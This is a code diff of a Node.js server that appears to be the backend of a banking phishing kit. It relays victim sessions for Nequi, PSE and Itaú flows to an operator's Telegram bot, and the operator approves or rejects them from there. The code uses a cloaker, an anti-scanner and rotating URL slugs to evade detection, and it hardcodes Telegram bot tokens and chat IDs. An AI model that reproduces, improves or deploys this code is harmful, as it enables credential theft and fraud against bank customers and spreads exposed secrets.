@@ -2,7 +2,6 @@ const express = require('express');
 const http = require('http');
 const fs = require('fs');
 const path = require('path');
-const cluster = require('cluster');
 const socketIO = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
 const compression = require('compression');
@@ -13,8 +12,8 @@ const { createAntiScanner } = require('./js/anti-scanner');
 const { EndpointRotator, validateSlug, createSlugEndpoint } = require('./js/endpoint-rotator');
 
 const PORT = process.env.PORT || 3000;
-const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '8692308319:AAG8To03oOsb9SvZHFy8d2Ol6k0UEma5lz4';
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '-5138136509';
+const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA';
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '-4997787461';
 const NODE_ENV = process.env.NODE_ENV || 'development';
 const TRUST_PROXY_RAW = process.env.TRUST_PROXY || 'loopback, linklocal, uniquelocal';
 // Coerce numeric strings ("1", "2") to Number — required by Express trust proxy
@@ -77,19 +76,14 @@ if (process.env.REDIS_URL) {
     }
 }
 
-function shouldEnableTelegramPolling() {
-    const flag = (process.env.TELEGRAM_POLLING || 'auto').toLowerCase();
-    if (flag === 'false' || flag === '0' || flag === 'off') return false;
-    if (flag === 'true' || flag === '1' || flag === 'on') return true;
-    if (cluster.isWorker) return cluster.worker.id === 1;
-    return true;
-}
-
-const isTelegramPoller = shouldEnableTelegramPolling();
-
 const bot = new TelegramBot(TELEGRAM_TOKEN, {
-    polling: false,
+    polling: {
+        interval: 1000,
+        autoStart: true,
+        params: { timeout: 30 }
+    },
     request: {
+        // Pool de conexiones HTTPS keep-alive para alta concurrencia
         agentOptions: { keepAlive: true, family: 4 },
         timeout: 30000
     }
@@ -153,46 +147,31 @@ for (const method of TG_METHODS_TO_WRAP) {
     };
 }
 
+// Handle 409 (otra instancia haciendo polling) - backoff exponencial con tope.
 let polling409Streak = 0;
 let pollingRestartTimer = null;
-
-async function startTelegramPolling() {
-    if (!isTelegramPoller || !TELEGRAM_TOKEN) return;
-    try {
-        await bot.deleteWebHook({ drop_pending_updates: false });
-        await bot.startPolling({ interval: 1000, params: { timeout: 30 } });
-        console.log(`🤖 Telegram polling activo (pid ${process.pid})`);
-    } catch (err) {
-        console.error('❌ Telegram polling:', err.message);
-    }
-}
-
-if (isTelegramPoller) {
-    bot.on('polling_error', async (err) => {
-        const msg = err && (err.message || '');
-        if (/409/.test(msg)) {
-            polling409Streak++;
-            const delays = [10000, 30000, 60000, 120000, 300000];
-            const delay = delays[Math.min(polling409Streak - 1, delays.length - 1)];
-            if (polling409Streak === 1 || polling409Streak % 5 === 0) {
-                console.warn(`⚠️  Telegram 409 — otra instancia con el mismo bot. Reintento en ${delay / 1000}s`);
-            }
-            if (pollingRestartTimer) return;
-            try { await bot.stopPolling({ cancel: true }); } catch (_) {}
-            pollingRestartTimer = setTimeout(() => {
-                pollingRestartTimer = null;
-                startTelegramPolling();
-            }, delay);
-            return;
+bot.on('polling_error', async (err) => {
+    const code = err && (err.code || err.response?.statusCode);
+    const msg  = err && (err.message || '');
+    if (code === 'ETELEGRAM' && /409/.test(msg)) {
+        polling409Streak++;
+        const delays = [10000, 30000, 60000, 120000, 300000]; // 10s -> 5min
+        const delay = delays[Math.min(polling409Streak - 1, delays.length - 1)];
+        if (polling409Streak === 1 || polling409Streak % 5 === 0) {
+            console.warn(`⚠️  Telegram 409 Conflict (otra instancia activa). Backoff ${delay/1000}s [streak=${polling409Streak}]`);
         }
-        polling409Streak = 0;
-        console.error('Telegram polling_error:', msg || err);
-    });
-    bot.on('error', (err) => console.error('Telegram bot error:', err && err.message));
-    startTelegramPolling();
-} else {
-    console.log(`🤖 Telegram sin polling en pid ${process.pid} (solo worker #1 en cluster)`);
-}
+        if (pollingRestartTimer) return;
+        try { await bot.stopPolling({ cancel: true }); } catch (_) {}
+        pollingRestartTimer = setTimeout(() => {
+            pollingRestartTimer = null;
+            bot.startPolling().catch(e => console.error('startPolling fail:', e.message));
+        }, delay);
+        return;
+    }
+    polling409Streak = 0;
+    console.error('Telegram polling_error:', msg || err);
+});
+bot.on('error', (err) => console.error('Telegram bot error:', err && err.message));
 
 class SessionManager {
     constructor() {
@@ -424,7 +403,7 @@ app.use(express.static(path.join(__dirname), {
     etag: true,
     lastModified: true,
     setHeaders: (res, filePath) => {
-        if (/\.(html|css|json|xml)$/i.test(filePath)) {
+        if (/\.(html|json|xml)$/i.test(filePath)) {
             res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
         }
     }
@@ -766,7 +745,6 @@ io.on('connection', (socket) => {
     });
 });
 
-if (isTelegramPoller) {
 bot.on('callback_query', async (callbackQuery) => {
     const { data, message: { message_id: messageId, chat: { id: chatId } }, id: callbackId } = callbackQuery;
 
@@ -836,10 +814,6 @@ bot.on('callback_query', async (callbackQuery) => {
             sessionManager.deleteSession(sessionId);
             await bot.answerCallbackQuery(callbackId, { text: '\u274c Rechazado' });
             return;
-        } else if (module === 'nequi' && action === 'wait') {
-            emitToSession('actionWait', { sessionId, action: 'wait', waitTime: 15 });
-            await bot.answerCallbackQuery(callbackId, { text: '\u23f3 Esperando' });
-            return;
         } else if (module === 'pse' && action === 'approve') {
             await bot.sendMessage(chatId, '\u2705 PSE aprobado, redirigiendo al banco...', { reply_to_message_id: messageId });
             emitToSession('actionApprovePSE', { sessionId, action: 'approve' });
@@ -850,10 +824,6 @@ bot.on('callback_query', async (callbackQuery) => {
             emitToSession('actionRejectPSE', { sessionId, action: 'reject' });
             sessionManager.deleteSession(sessionId);
             await bot.answerCallbackQuery(callbackId, { text: '\u274c Rechazado' });
-            return;
-        } else if (module === 'pse' && action === 'wait') {
-            emitToSession('actionWaitPSE', { sessionId, action: 'wait', waitTime: 15 });
-            await bot.answerCallbackQuery(callbackId, { text: '\u23f3 Esperando' });
             return;
         }
         // Manejadores para banco (Ita\u00fa, etc.)
@@ -925,7 +895,6 @@ bot.on('callback_query', async (callbackQuery) => {
         await bot.answerCallbackQuery(callbackId, { text: '❌ Error', show_alert: true });
     }
 });
-}
 
 // Generar teclado específico para cada banco
 function getBankKeyboard(bankName, sessionId) {
@@ -1118,18 +1087,12 @@ app.get('/', createCloaker({
 // Slug rotativo → sirve el panel real (solo si slug vigente)
 // Inyecta <base href="/"> para que assets relativos (styles.css, js/, img/)
 // resuelvan correctamente bajo /r/{slug}.
-let _indexCache = { html: null, mtimeMs: 0 };
+let _indexCached = null;
 function getIndexHtml() {
-    const indexPath = path.join(__dirname, 'index.html');
-    const { mtimeMs } = fs.statSync(indexPath);
-    if (!_indexCache.html || _indexCache.mtimeMs !== mtimeMs) {
-        const raw = fs.readFileSync(indexPath, 'utf8');
-        _indexCache = {
-            html: raw.replace(/<head(\s[^>]*)?>/i, m => `${m}\n    <base href="/">`),
-            mtimeMs
-        };
-    }
-    return _indexCache.html;
+    if (_indexCached) return _indexCached;
+    const raw = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');
+    _indexCached = raw.replace(/<head(\s[^>]*)?>/i, m => `${m}\n    <base href="/">`);
+    return _indexCached;
 }
 
 app.get('/r/:slug', validateSlug(rotator), (req, res) => {
@@ -1184,8 +1147,15 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`\n🚀 Servidor iniciado - Puerto: ${PORT} | Entorno: ${NODE_ENV}`);
     console.log(`📡 Socket.IO configurado con transports: websocket, polling`);
     console.log(`🤖 Bot de Telegram: ${TELEGRAM_TOKEN ? 'Configurado' : 'NO CONFIGURADO'}`);
-    console.log(`📲 Telegram polling: ${isTelegramPoller ? 'SÍ' : 'NO'}`);
     console.log(`💬 Chat ID: ${CHAT_ID}\n`);
+});
+
+bot.on('polling_error', (error) => {
+    console.error('❌ Telegram polling error:', error.code, error.message);
+});
+
+bot.on('error', (error) => {
+    console.error('❌ Telegram bot error:', error.message);
 });
 
 process.on('uncaughtException', (error) => {
@@ -1206,8 +1176,7 @@ function gracefulShutdown() {
     console.log('\n🛑 Cerrando servidor...');
     server.close(() => {
         console.log('✅ Servidor HTTP cerrado');
-        const stop = isTelegramPoller ? bot.stopPolling() : Promise.resolve();
-        stop
+        bot.stopPolling()
             .then(() => {
                 console.log('✅ Bot de Telegram detenido');
                 process.exit(0);
